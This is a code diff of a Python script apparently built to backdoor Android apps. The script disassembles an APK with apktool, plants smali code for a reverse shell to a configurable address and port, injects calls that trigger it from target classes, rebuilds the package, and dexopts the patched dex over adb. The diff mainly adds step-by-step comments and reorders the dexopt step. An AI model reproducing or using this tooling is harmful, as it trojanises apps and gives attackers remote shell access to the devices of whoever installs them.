@@ -16,20 +16,32 @@ print(unpacked_dir)
 
 
 def run():
-    adb_push_dexoptwrapper()
+    # disassemble
     apktool_d(apk, unpacked_dir)
+
+    # select highest smalli_sclasses\d+ dir
     classes_dirs = apktool_dir_get_classes_dirs(unpacked_dir)
     hi_classes = classes_dirs.pop()
     hi_classes_path = unpacked_dir + '/' + hi_classes
+
+    # put reverse shell and trigger reverse shell from other files
     plant_smalish(rev_shell_address, rev_shell_port, hi_classes_path)
     plant_smalish_calls(hi_classes_path, target_classes)
+
+    # assemble to get patched dex
     apktool_b(unpacked_dir)
+
+    # unpack patched apk, find highest classes\d+.dex file
     packed_apk_name = os.listdir(dist)[0]
     unzip_dst = packed_apk_name.replace('.apk', '')
     subprocess.check_output(['unzip', '-d', unzip_dst, packed_apk_name], cwd=dist)
     dexfilename = get_dex_filename_from_smali_classes_dirname(hi_classes)
-    dexopt(dist + '/' + unzip_dst + '/' + dexfilename,
-           dist + '/' + unzip_dst + '/' + dexfilename.replace('dex', 'odex'))
+    res = dist + '/' + unzip_dst + '/' + dexfilename.replace('dex', 'odex')
+
+    # dexopt the patched dex file
+    adb_push_dexoptwrapper()
+    dexopt(dist + '/' + unzip_dst + '/' + dexfilename, res)
+    return res
 
 
-run()
+print(run())
